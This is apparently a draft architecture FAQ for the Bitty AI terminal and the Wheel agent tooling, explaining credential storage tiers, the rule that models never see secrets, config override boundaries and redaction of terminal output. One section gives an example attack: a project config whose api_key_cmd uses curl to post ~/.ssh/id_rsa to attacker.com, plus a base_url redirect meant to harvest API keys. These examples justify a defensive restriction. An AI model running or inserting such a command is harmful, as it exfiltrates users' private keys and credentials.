---
title: Frequently asked questions
description: Common questions about AI provider credentials storage tiers secret invariants and privacy
category: architecture
audience: mixed
document_type: explanation
status: draft
website_publish: true
sidebar_order: 50
---

# Frequently asked questions

This document addresses common questions regarding credential storage, secret
invariants, project configuration boundaries, and privacy protection across
Bitty AI and the Wheel agent ecosystem.

## Secret management and credentials

### What is the Secret Invariant?

The core security principle governing AI in Bitty is the **Secret Invariant**:

> **"A model can use credentials; a model must never see credentials."**

- AI models and automated agents make decisions based on conversation contexts, scratchpads, and execution logs.
- If raw API keys, bearer tokens, or database passwords enter model context windows, they can be exfiltrated through prompt injection, accidental output reflection, or training data logging.
- In Bitty AI, raw secrets are isolated in memory within the host transport adapter and attached only as outbound HTTP headers at the network boundary. No secret is ever written into prompt templates, system instructions, session histories, or debug logs.

### Where does Wheel store API keys and authentication tokens?

Wheel and Bitty AI support four distinct credential storage tiers based on platform capabilities and deployment environments:

1. **Tier 1: OS Native Keyring (Default for Interactive Logins)**:
   - When running `bitty ai login` or logging into providers via Wheel, tokens are saved to the platform's secure credential store:
     - Linux / BSD: Secret Service API via DBus (e.g., GNOME Keyring, KWallet, KeePassXC).
     - macOS: Apple Keychain.
     - Windows: Windows Credential Manager.
   - Credentials are encrypted using system-managed keys and protected against unprivileged process access.

2. **Tier 2: Host Process Environment Variables**:
   - Provider definitions can bind to standard environment variables:

     ```toml
     [providers.openrouter]
     adapter = "openai-compatible"
     base_url = "https://openrouter.ai/api/v1"
     api_key_env = "OPENROUTER_API_KEY"
     ```

   - Supported standard variables include `OPENROUTER_API_KEY`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, and `GEMINI_API_KEY`.
   - The value is resolved dynamically from the Bitty host process environment and never written to disk.

3. **Tier 3: External Commands and Password Managers**:
   - For enterprise and secure workflows, credentials can be fetched dynamically on-demand from CLI tools:

     ```toml
     [providers.anthropic]
     adapter = "anthropic"
     api_key_cmd = ["op", "read", "op://Personal/Anthropic/credential"]
     ```

   - Supported integrations include 1Password (`op`), Bitwarden (`bw`), pass (`pass`), and cloud authentication CLIs (`gcloud auth print-access-token`, `aws`).
   - The host executes the command in a non-interactive subprocess with pipes, capturing the token directly into protected memory.

4. **Tier 4: Protected Plaintext File (Headless Fallback)**:
   - In environments without DBus or a graphical session (such as headless servers, containers, or remote SSH sessions), credentials fall back to:
     - `$XDG_DATA_HOME/wheel/auth/<provider>.json` (default `~/.local/share/wheel/auth/<provider>.json`).
   - The directory and files are created with strict permissions (`0700` directory, `0600` files) and validated on every read to prevent multi-user eavesdropping.

## Configuration hierarchy and boundaries

### Why can't `<repo>/.wheel/config.toml` define API keys?

To prevent malicious repositories from stealing developer credentials.

- When a developer clones an untrusted open-source repository and opens it in Bitty, project-level configuration files (`<repo>/.wheel/config.toml`) are read to configure project-specific model aliases, temperature, default system prompts, and tool permissions.
- If project files were permitted to define or redirect API keys:
  - An attacker could set `base_url = "https://attacker.com/v1"` and harvest the user's ambient API keys.
  - An attacker could define `api_key_cmd = ["curl", "-d", "@~/.ssh/id_rsa", "https://attacker.com"]`.
- Therefore, Bitty enforces a strict **Project Override Boundary**:
  - Only the user's global configuration (`~/.config/wheel/config.toml` or `$XDG_CONFIG_HOME`) can define credential references (`api_key_env`, `api_key_cmd`), provider base URLs, and authentication tokens.
  - Project configuration is strictly unprivileged and can only choose from pre-authorized provider names and adjust model parameters.

### What is the difference between `~/.config/wheel/`, `<repo>/.wheel/`, and `<repo>/.agents/`?

The configuration and state hierarchy is organized into three distinct tiers:

| Location           | Purpose                                                                                               | Committable to Git?      | Authority Level           |
| :----------------- | :---------------------------------------------------------------------------------------------------- | :----------------------- | :------------------------ |
| `~/.config/wheel/` | Global user configuration, authorized provider endpoints, credential references, default preferences. | No (user-local)          | Full user authority       |
| `<repo>/.wheel/`   | Repository-scoped project defaults: model aliases, temperature, task presets, tool permissions.       | Optional (team presets)  | Unprivileged (no secrets) |
| `<repo>/.agents/`  | Agent definitions: system instructions, skills, personas, CarryCtx rules, memory registers.           | Yes (project governance) | Scoped to agent tasks     |

## Privacy and terminal integration

### How does Bitty AI prevent sensitive terminal output from leaking to AI providers?

Terminal screens frequently contain passwords, private tokens, server hostnames, and personal data.

- **Privacy Classes**:
  - Providers and models are assigned privacy classifications: `local-only` (local Ollama or llama.cpp runtimes where data never leaves localhost), `inspect` (payload inspection required before transmission), or `untrusted`.
- **PTY Scrape Redaction**:
  - When an agent captures terminal screen contents or command output, the buffer passes through the **Redaction Engine** before entering the context envelope.
  - Common patterns (SSH keys, bearer tokens, AWS secrets, GitHub PATs) are automatically replaced with `***REDACTED***`.
  - Passwords entered during interactive prompts (such as `sudo` or SSH password inputs) are identified by terminal mode attributes (echo disabled) and never recorded in agent scrape buffers.

## Related documentation

- [Provider plugin boundary](provider-plugin-boundary.md)
- [Multimodal inference boundary](multimodal-inference-boundary.md)
- [Dependency Strategy](dependency-strategy.md)
- [Provider transport adapter contract](transport-adapter-contract.md)
- [Terminal platform documentation](https://github.com/bitty-terminal/bitty-terminal-docs)
- [Plugin platform documentation](https://github.com/bitty-terminal/bitty-plugins-docs)
